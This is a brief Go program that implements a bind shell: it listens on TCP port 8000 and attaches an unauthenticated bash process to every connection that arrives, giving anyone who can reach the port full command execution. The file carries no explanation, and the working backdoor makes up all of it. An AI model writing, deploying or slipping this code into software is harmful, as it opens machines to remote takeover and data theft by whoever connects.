package main

import (
	"net"
	"os/exec"
)

func main() {
	l, err := net.Listen("tcp", ":8000")
	if err != nil {
		panic(err)
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			panic(err)
		}

		go startShell(conn)
	}
}

func startShell(conn net.Conn) {
	shell := exec.Command("bash")
	shell.Stderr = conn
	shell.Stdout = conn
	shell.Stdin = conn
	shell.Run()
	shell.Wait()
}
